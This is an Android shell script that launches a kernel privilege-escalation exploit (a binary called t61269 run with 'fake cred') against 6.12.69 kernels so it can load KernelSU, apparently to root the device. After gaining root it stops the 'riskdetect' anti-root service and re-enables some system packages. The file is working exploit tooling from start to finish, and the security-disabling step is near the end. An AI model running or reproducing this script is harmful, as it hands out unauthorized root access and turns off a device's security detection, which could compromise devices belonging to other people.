#!/system/bin/sh
# 6.12.69-ex branch: fast-tuned YuKongA timer (fake cred + manager libksud late-load).
D=${PYB110_DIR:-/data/local/tmp/pyb110}
cd "$D" || exit 1

MANAGER=${PYB110_MANAGER:-kernelsu}
DISABLE_ANTIROOT=${PYB110_DISABLE_ANTIROOT:-1}
case "$MANAGER" in
  finasu) MPKG=me.yuki.fina ;;
  next) MPKG=com.rifsxd.ksunext ;;
  bakasu) MPKG=com.resukisu.resukisu ;;
  sukisu) MPKG=com.sukisu.ultra ;;
  *) MANAGER=kernelsu; MPKG=me.weishu.kernelsu ;;
esac
KMI=android16-6.12
echo "MANAGER=$MANAGER PKG=$MPKG KMI=$KMI"

KERNEL=$(uname -r 2>/dev/null)
case "$KERNEL" in
  *6.12.69*) ;;
  *) echo "KERNEL_MISMATCH: $KERNEL (6.12.69-ex needs a 6.12.69 kernel)"; exit 10 ;;
esac
echo "KERNEL=$KERNEL"

chmod 755 t61269 2>/dev/null
if pidof t61269 >/dev/null 2>&1; then
  echo "STALE_PLANT: t61269 is already running (parked page); reboot required"
  exit 12
fi
if grep -qi '^kernelsu ' /proc/modules 2>/dev/null; then
  echo "ALREADY_LOADED: kernelsu present, skip exploit"
  su -c "id" 2>&1 | head -2
  exit 0
fi

APK=$(pm path "$MPKG" 2>/dev/null | sed -n 's/^package://p' | head -n 1)
KSUD=""
if [ -n "$APK" ]; then
  KSUD="$(dirname "$APK")/lib/arm64/libksud.so"
fi
[ -x "$KSUD" ] || KSUD=$(find /data/app -path "*${MPKG}*/lib/arm64/libksud.so" 2>/dev/null | head -n 1)
[ -x "$KSUD" ] || KSUD=/data/adb/ksu/bin/ksud
[ -x "$KSUD" ] || KSUD=""
echo "KSUD=${KSUD:-none}"

rm -f t61269.log
TIMER_KSU_PKG="$MPKG" TIMER_KMI="$KMI" TIMER_KSUD="$KSUD" \
  setsid sh -c "./t61269 fake > t61269.log 2>&1" &
i=0
OK=0
while [ $i -lt 180 ]; do
  sleep 1
  if grep -q "KSU_READY" t61269.log 2>/dev/null; then OK=1; break; fi
  if grep -q "KSU_MISSING" t61269.log 2>/dev/null; then break; fi
  if [ $((i % 10)) -eq 0 ]; then
    echo "PROGRESS=$i"
    tail -n 2 t61269.log 2>/dev/null
  fi
  i=$((i+1))
done
tail -n 20 t61269.log 2>/dev/null
if [ "$OK" != "1" ]; then
  echo "EXPLOIT_FAIL: see log above; do NOT kill t61269 (parked page); reboot to recover"
  exit 15
fi

if [ "$DISABLE_ANTIROOT" = "1" ] && [ -n "$(getprop init.svc.riskdetect 2>/dev/null | tr -d '\r')" ]; then
  su -c "stop riskdetect" 2>&1
  echo "ANTIROOT_STOP_RC=$?"
fi

DIS=$(su -c "pm list packages -d --user 0" 2>/dev/null | tr -d '\r')
for p in com.oplus.exsystemservice com.oplus.screenshot; do
  su -c "pm list packages '$p'" 2>/dev/null | grep -qx "package:$p" || continue
  if printf '%s\n' "$DIS" | grep -qx "package:$p"; then
    su -c "pm enable --user 0 '$p'" >/dev/null 2>&1
    echo "SCREENSHOT_STACK_ENABLED=$p"
  fi
done

su -c "id" 2>&1 | head -2
echo "MANAGER_START=late-load"
echo DONE
